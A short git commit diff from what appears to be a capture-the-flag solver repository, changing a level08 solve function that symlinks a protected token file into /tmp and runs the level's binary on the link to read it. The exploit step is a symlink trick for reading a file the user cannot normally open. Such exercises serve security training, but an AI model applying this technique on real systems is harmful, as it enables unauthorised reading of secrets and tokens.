26011f03fa496043806bb8cf5c774d83cb08b277
Timoti Fregni <timotif@gmail.com>
2025-01-26 13:00:54 +0100

    fixed bug

--- level08/resources/level08.py
+++ level08/resources/level08.py
@@ -1,6 +1,4 @@
-from solver.utils import extract_flag
-
 def solve(connection):
 	connection.exec("ln -s /home/user/level08/token /tmp/exploit")
 	flag = connection.exec("./level08 /tmp/exploit")
-	return "", extract_flag(flag)
+	return "", flag
